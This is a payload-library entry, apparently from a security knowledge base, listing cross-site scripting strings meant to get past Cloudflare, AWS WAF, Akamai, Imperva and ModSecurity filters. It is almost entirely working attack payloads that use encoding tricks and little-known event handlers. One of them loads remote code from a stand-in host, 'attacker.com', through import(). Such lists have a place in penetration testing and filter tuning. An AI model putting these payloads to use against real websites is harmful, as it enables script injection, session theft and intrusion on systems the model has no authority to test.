---
id: "xss-waf_bypass-payloads"
title: "XSS Payloads - WAF & Filter Bypass"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "waf_bypass", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Advanced techniques to bypass Web Application Firewalls and security filters

## Payloads

### Cloudflare Bypass

Specific technique to bypass Cloudflare WAF

- **Contexts**: html
- **Severity**: high

```html
<svg/onload=alert(1)//>
```

### ModSecurity Bypass

Bypass ModSecurity CRS rules

- **Contexts**: html
- **Severity**: high

```html
<img src=1 onerror=alert(1)>
```

### AWS WAF Bypass

Technique to bypass AWS WAF

- **Contexts**: script
- **Severity**: high

```html
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### Akamai Bypass

Bypass Akamai Kona Site Defender

- **Contexts**: html
- **Severity**: high

```html
<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>
```

### Imperva Bypass

Bypass Imperva SecureSphere WAF

- **Contexts**: html
- **Severity**: high

```html
<svg><script>alert&#40;1&#41;</script>
```

### Cloudflare — Entity Padding

HTML entity with excessive zero-padding bypasses Cloudflare regex

- **Contexts**: html
- **Severity**: high

```html
<svg onload=prompt%26%230000000040document.domain)>
```

### Cloudflare — Tab Splitting

Tab and newline characters in javascript: URI bypass Cloudflare

- **Contexts**: url, attribute
- **Severity**: high

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Cloudflare — Optional Chaining

JS optional chaining syntax not in Cloudflare signatures

- **Contexts**: html
- **Severity**: high

```html
<svg onx=() onload=window.alert?.()>
```

### Cloudflare — Import Expression

Dynamic import() bypasses script-src inline blocks

- **Contexts**: html
- **Severity**: high

```html
<img src=x onError=import('//attacker.com/')>
```

### Cloudflare — Double URL Encode

Double URL encoding slips past Cloudflare's single-decode check

- **Contexts**: html
- **Severity**: high

```html
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
```

### Cloudflare — Ignored Attribute Prefix

Invalid attribute before real event handler confuses parser

- **Contexts**: html
- **Severity**: high

```html
<svg on =i onload=alert(domain)>
```

### AWS WAF — Popover API

onbeforetoggle not in OWASP CRS — bypasses AWS WAF managed rules

- **Contexts**: html
- **Severity**: high

```html
<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>
```

### AWS WAF — Content Visibility

CSS-triggered event not in any WAF ruleset

- **Contexts**: html
- **Severity**: high

```html
<xss oncontentvisibilityautostatechange=alert(1) style="display:block;content-visibility:auto">
```

### Akamai — SrcDoc Injection

Akamai doesn't deeply inspect srcdoc attribute HTML entities

- **Contexts**: html
- **Severity**: high

```html
<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>
```

### Akamai — SVG Animate

SVG animatetransform onbegin bypasses Akamai event blocklist

- **Contexts**: html
- **Severity**: high

```html
<svg><animatetransform onbegin=alert(1)>
```
